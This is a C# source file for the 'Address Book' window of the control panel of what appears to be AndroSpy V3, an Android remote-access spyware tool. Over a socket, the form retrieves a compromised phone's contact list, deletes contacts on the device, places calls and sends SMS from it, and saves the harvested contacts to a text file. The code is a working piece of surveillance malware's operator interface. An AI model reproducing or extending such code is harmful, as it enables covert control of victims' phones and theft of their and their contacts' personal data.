using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class Rehber : MetroFramework.Forms.MetroForm
    {
        Socket sco; public string ID = "";
        public Rehber(Socket sck, string aydi)
        {
            InitializeComponent();
            ID = aydi; sco = sck;
        }
        List<ListViewItem> lArray = new List<ListViewItem>();
        public void bilgileriIsle(string arg)
        {
            listView1.Items.Clear();
            lArray.Clear();
            if (arg != "REHBER YOK")
            {
                string[] ana_Veriler = arg.Split(new[] { "[MYCONTACTDATA]" }, StringSplitOptions.None);
                for (int k = 0; k < ana_Veriler.Length; k++)
                {
                    try
                    {
                        string[] bilgiler = ana_Veriler[k].Split(new[] { "[MYCONTACT]" }, StringSplitOptions.None);
                        ListViewItem item = new ListViewItem(bilgiler[0]);
                        item.ImageIndex = 0;
                        item.SubItems.Add(bilgiler[1]);
                        lArray.Add(item);
                    }
                    catch (Exception) { }
                }
                listView1.Items.AddRange(lArray.ToArray());
                metroLabel1.Text = "Items: " + listView1.Items.Count.ToString();
            }
            else
            {
                ListViewItem item = new ListViewItem("There is no Contact");
                listView1.Items.Add(item);
                metroLabel1.Text = "Items: 0";
            }
        }
        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Ekle(sco).Show();
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                if (listView1.SelectedItems[0].Text.Contains("There is no")) return;
                bool dioresult = MessageBox.Show("Are you sure delete selected (" + listView1.SelectedItems.Count.ToString() + ") names?",
                    "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes;
                if (!dioresult) return;
                foreach (ListViewItem lvi in listView1.SelectedItems)
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("REHBERSIL", Encoding.UTF8.GetBytes(lvi.Text));
                        sco.Send(senddata, 0, senddata.Length, SocketFlags.None);
                        lvi.Remove();
                    }
                    catch (Exception) { }
                    System.Threading.Tasks.Task.Delay(5);
                }
            }
            Text = "Adress Book - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(sco.Handle.ToString());
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("REHBERIVER", Encoding.UTF8.GetBytes("ECHO"));
                sco.Send(senddata, 0, senddata.Length, SocketFlags.None);
                Text = "Adress Book - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(sco.Handle.ToString());
            }
            catch (Exception) { }
        }

        private void callToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].Text.Contains("There is no")) return;
                try
                {
                    byte[] senddata = Form1.MyDataPacker("ARA", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text));
                    sco.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
        }

        private void sendSMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].Text.Contains("There is no")) return;
                new SMS(sco, listView1.SelectedItems[0].SubItems[1].Text) { Text = "SMS - " + Text.Replace("Adress Book - ", "") }.Show();
            }
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].Text.Contains("There is no")) return;
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
            }
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string format = "Name          Number";
            string line = "----          ------";
            using (SaveFileDialog op = new SaveFileDialog
            {
                Filter = "Plain Text File (*.txt)|*.txt",
                Title = "Save the contact list as text file"
            })
            {
                if (op.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        using (System.IO.StreamWriter sw = new System.IO.StreamWriter(op.FileName))
                        {
                            sw.WriteLine(format);
                            sw.WriteLine(line + Environment.NewLine);
                            foreach (ListViewItem lvi in listView1.Items)
                            {
                                sw.WriteLine(lvi.Text + "          " + lvi.SubItems[1].Text + Environment.NewLine);
                            }
                            sw.Write("-------------THE END-------------");
                        }
                        MessageBox.Show("Contact list succesfully saved.", "AndroSpy V3", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Contact list couldn't saved:\n" + ex.Message, "AndroSpy V3", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    }
                }
            }
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            metroLabel2.Text = "Selected: " + listView1.SelectedItems.Count.ToString();
        }
    }
}
